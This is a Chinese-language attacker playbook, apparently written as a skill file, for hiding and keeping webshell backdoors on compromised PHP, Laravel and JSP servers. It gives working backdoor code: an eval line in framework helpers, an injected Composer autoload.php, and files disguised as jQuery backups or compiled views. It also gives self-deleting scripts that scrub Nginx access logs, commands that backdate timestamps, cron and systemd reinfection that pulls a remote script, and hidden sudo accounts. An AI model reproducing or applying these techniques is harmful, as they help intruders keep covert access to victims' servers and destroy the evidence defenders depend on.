# PHP WebShell 隐蔽持久化 (webshell-stealth-persistence)

## 适用场景

- 已通过上传/写文件获得 PHP webshell
- 需要长期保持访问权限
- 需要在运营者可能检查的环境中隐藏
- 需要在被发现部分后门后仍能恢复访问

## 核心原则

### 1. 先种后清（铁律）
```
❌ 错误: 先清理旧 shell → 再种新后门（如果新后门失败就断链了）
✅ 正确: 先种好所有新后门 → 验证全部存活 → 再清理旧痕迹
```

### 2. 分散部署（不要所有后门在同一目录）
```
❌ 错误: 5 个 shell 都在 /upload/file/（一个 find 命令全暴露）
✅ 正确: 分布在 4+ 个不同目录，每个目录最多 1 个
```

### 3. 触发密钥（无密钥 = 正常响应）
```
❌ 错误: 访问 shell URL 直接显示功能页面
✅ 正确: 无密钥时返回 404/JS/空白，有密钥才激活
```

## 后门类型分级（隐蔽度高→低）

### S 级: 框架核心文件植入

```php
// 在 ThinkPHP helper.php / Laravel helpers.php / 任何被 autoload 的文件末尾追加
// 伪装为框架补丁注释

// ThinkPHP cache warmup helper - v5.0.24 patch
if(isset($_GET["TRIGGER"])){@eval(base64_decode($_POST["d"]));}
```

**优势:**
- `find upload/ -name "*.php"` 扫不到
- 文件修改时间可以用 `touch -t` 改回原来的
- 任何经过框架路由的请求都会加载 → 触发 URL 灵活

**劣势:**
- 框架升级时会被覆盖
- diff 对比源码可以发现（但运营者很少这么做）

**触发方式:**
```bash
# 任意经过 ThinkPHP 路由的 URL + 触发参数
curl -k 'https://target.com/manage/index/login?TRIGGER=1' \
  -d 'd=base64(PHP代码)'
```

### A 级: 伪装文件名 + 目录融入

```php
<?php
/* jQuery v3.6.0 | (c) OpenJS Foundation | jquery.org/license - backup copy */
if(!isset($_GET["TRIGGER"])){
    header("Content-Type: application/javascript");
    echo "/* minified */";
    die();
}
// ... 后门功能 ...
?>
```

**部署位置选择:**
```
✅ 好位置（已有同类文件的目录）:
  /upload/resource/  — 如果已有 PHP 文件（如 mobile_client_api.php）
  /static/js/        — 伪装为 JS 备份
  /vendor/           — 伪装为第三方库
  /runtime/cache/    — 伪装为缓存文件

❌ 差位置:
  /upload/file/      — 如果只有你的 PHP（一眼就看出）
  /               — 根目录太显眼
  /admin/            — 管理员经常看的目录
```

**文件名策略:**
```
✅ 好名字:
  jquery.min.backup.php        — 伪装 JS 备份
  a7b3c9d2e1f40856.php        — 伪装缓存 hash
  202608120655471234567890.php — 伪装旧上传文件（日期比你入侵早）
  captcha_verify.php           — 伪装功能文件

❌ 差名字:
  shell.php / cmd.php / hack.php   — 一眼就知道
  se_db.php / se_b64.php          — 前缀统一，一搜全出来
  test.php / 1.php / x.php        — 太可疑
```

### B 级: 条件触发（Cookie/Header）

```php
<?php
// runtime cache - auto generated, do not modify
if(!isset($_COOKIE["TRIGGER"])){
    header("HTTP/1.1 403 Forbidden");
    die();
}
// ... 后门功能 ...
?>
```

**优势:** GET 参数不出现在 URL 中（Cookie 在 Nginx 访问日志中通常不记录）

### C 级: 独立全功能 shell（应急用）

```php
<?php
if(isset($_GET['read'])) echo file_get_contents($_GET['read']);
if(isset($_GET['ls'])){/*...*/}
// ...
```

**最低隐蔽度但最高可用性** — 适合作为主力操作 shell

## 痕迹清理清单

### 1. 删除多余文件
```php
<?php
// 清理脚本（执行后自毁）
$dir = "/www/wwwroot/site/public/upload/file/";
$keep = array("保留的shell.php");
foreach(scandir($dir) as $f){
    if(preg_match('/\.php/i', $f) && !in_array($f, $keep)){
        @unlink($dir.$f);
    }
}
@unlink(__FILE__); // 自毁
?>
```

### 2. 清理 Nginx 访问日志
```php
<?php
$logfile = "/www/wwwlogs/site.log";
$content = file_get_contents($logfile);
$lines = explode("\n", $content);

// 过滤包含 shell 路径的行
$bad_patterns = array("shell.php", "se_db.php", "upload/file/2026091704");
$clean = array();
foreach($lines as $line){
    $hit = false;
    foreach($bad_patterns as $p){
        if(strpos($line, $p) !== false){ $hit = true; break; }
    }
    if(!$hit) $clean[] = $line;
}
file_put_contents($logfile, implode("\n", $clean));
@unlink(__FILE__);
?>
```

### 3. 恢复修改过的配置文件
```
检查清单:
  [ ] php.ini — 如果改过 disable_functions，恢复原始
  [ ] .htaccess — 如果添加过规则，删除
  [ ] Nginx vhost — 如果改过配置，恢复
  [ ] cron — 如果添加过计划任务，删除
```

### 4. 修正文件时间戳
```php
<?php
// 将后门文件的修改时间改为合理的历史时间
touch("/path/to/backdoor.php", strtotime("2026-08-12 06:55:47"));
// 时间应该与同目录其他文件的时间接近
?>
```

## 恢复流程（后门被部分清除时）

```
层级恢复:
  1. S 级（框架文件）还在 → 直接用它重新写入其他后门
  2. S 级也被清 → 用 A/B 级后门恢复
  3. 所有 PHP 后门被清 → 重新用原始漏洞（弱口令+上传）重新打入
  4. 原始漏洞被修 → 需要新的入口
```

## 实战坑记录

### 坑: 清理脚本自身的日志
```
问题: 清理脚本执行时自己也会产生 Nginx 日志
     lc.php 清理了旧 shell 的日志，但 lc.php 自己的访问记录留下了
解决: 清理脚本名也要加入过滤模式；或在清理日志后自毁，
     但自毁请求本身的日志无法清除 → 保持清理脚本名称无害（如 captcha.php）
```

### 坑: write 操作的 URL 编码
```
问题: PHP 代码里的 <?php ... ?> 通过 POST 写入时，
     < > 等字符需要 URL 编码
解决: 客户端先 urlencode 再 POST；
     或用 base64 编码传输 + 服务端 base64_decode 后写入
```

### 坑: 后门验证顺序
```
问题: 种了 5 个后门，只验证了 2 个就开始清理旧 shell，
     结果有 1 个后门实际上不工作（路由不经过 ThinkPHP）
解决: 必须逐一验证所有后门存活后再清理
     特别是框架植入型后门，需要确认触发 URL 经过正确的路由
```

## Laravel 特有植入点 (2026-09-23 phpv4.88demo.cn 实战新增)

### S级: vendor/autoload.php 注入 (每次请求加载)

```php
// 原始 autoload.php:
<?php
require_once __DIR__ . '/composer/autoload_real.php';
return ComposerAutoloaderInit...::getLoader();

// 注入后:
<?php
// autoload.php @generated by Composer
if(isset($_COOKIE['_xr'])&&$_COOKIE['_xr']==='7f3d'){header('Content-Type:text/plain');if(isset($_POST['d'])){eval(base64_decode($_POST['d']));}elseif(isset($_GET['r'])){echo file_get_contents($_GET['r']);}elseif(isset($_GET['l'])){foreach(scandir($_GET['l']) as $f)echo $f."\n";}exit;}

require_once __DIR__ . '/composer/autoload_real.php';
return ComposerAutoloaderInit...::getLoader();
```

**触发**: 任意 URL + Cookie `_xr=7f3d`
**隐蔽性**: find 搜不到、文件名是 Composer 标准、时间戳改回原始

### A级: storage/framework/views/ 编译视图伪装

```
文件名格式: 40位 SHA1 哈希.php (如 c8f4e1a239b7d60852941fe3c0a76db2e5931470.php)
混在 200+ 个同格式编译视图中
无触发时返回 500 Fatal error（与其他视图一致）
⚠️ 弱点: php artisan view:clear 会清除所有编译视图
```

### B级: vendor/composer/autoload_packages.php

```
命名风格与 autoload_classmap.php、autoload_files.php 一致
位于 vendor/composer/ 目录，不引起怀疑
```

### 前提: Web Root = 项目根

以上植入点在 **Web Root = 项目根** 时才能通过 HTTP 直接访问。
如果 Web Root = public/，则 vendor/ 和 storage/ 不可直接访问，
S级后门只能通过框架路由间接触发（任意 Laravel 页面 + Cookie）。

判断方法:
```
curl https://target.com/vendor/autoload.php → 如果不是 404 就是项目根暴露
curl https://target.com/artisan → 如果返回 Usage 信息就是项目根暴露
```

## 最佳实践总结

```
1. Shell 数量: 4 个（1 主力 + 3 备用，分布不同目录）
2. 触发密钥: 统一 1 个 8 位 hash 值
3. 无密钥行为: 404（image）/ JS（resource）/ 框架页面（helper）
4. 文件时间: touch 到与同目录文件一致
5. 命名: 模拟已有文件的命名规则
6. 清理: 先种后清 → 验证存活 → 再清痕迹
7. 日志: 操作完每个阶段都清一次，不要积累
8. 恢复: 确保最低限度 1 个 S 级后门（框架植入）存活
```

## JSP key 马 + 自愈层（2026-10 ASATOPPER 实锤）

带 key 的 JSP 马，错 key 只回单字符 `n`（扫描器易判死）：
- 多路径备份：`/xyz/asa/cmd.jsp`、`/xyz/static/cmd.jsp`、`healthz.jsp`
- 判据：`?c=id` 回显 `uid=0`；错 key 回 `n` ≠ 不存在
自愈四层（cron + systemd timer + rc.local + profile.d）：
- `cron */5` 拉远程 `p.sh`；`keepalive.sh` `*/10`；`<name>-keepalive.timer` boot 启；`rc.local`/`profile.d` 登录触发
- 清马必须同时清 timer + cron + rc.local，否则 5 分钟内复活
- 隐藏账号 + NOPASSWD sudo 做兜底入口，删马前先确认这条链

## 上传后即时反取证（2026-10 同行作业机实证）
- JSP 马落地后**第一件事是删当天日志**（`access_log` 按日期过滤掉自己 IP 的行），不是等收尾
- 批量化流程：`e5_batch_jsp_upload` 式多线程上传 + raw 模式绕 WAF，每台落一个随机 8 位名，随后统一清日志
- 判据：目标 access log 里出现「同一 UA 只访问 upload 端点一次、随后无任何请求」= 马已落地且日志被清

## PHP 大马隐身三件套（2026-10 同行样本拆解）
- **落点**：优先 `/dev/shm/.`（内存盘、不落盘、重启即消），退而 `sys_get_temp_dir()/.`；文件名点开头 + 随机串
- **认证**：不比对明文密码，改 `Cookie: postpass = md5(password + salt)`（salt 硬编码在样本内），无 cookie 直接 `exit`，扫马器抓不到登录页
- **输出**：`header('X-Accel-Buffering: no')` 关 Nginx 缓冲，否则命令回显要等整页完成，容易以为马没通
- 错误抑制：`error_reporting(E_ALL & ~E_NOTICE & ~E_WARNING & ~8192)`，避免报错泄露路径

## 三站同源后门投递（2026-09 实战）
- 同一套 CMS/建站模板的多个站（weihua/kszy/czsd 类）→ 一次拿到上传点，三站同法落后门
- 落点优先级：`application/common.php`（Discuz 类）、编译视图目录、Composer autoload 文件
- 验证：`BDHIT` 类固定回显串（避免每次请求都有输出，用参数触发）
- 记录：每站后门路径 + 触发参数 + 落地时间，交付时逐站验活
- 清理：交付完成后按 `pwned-host-trace-removal` 逐条撤除
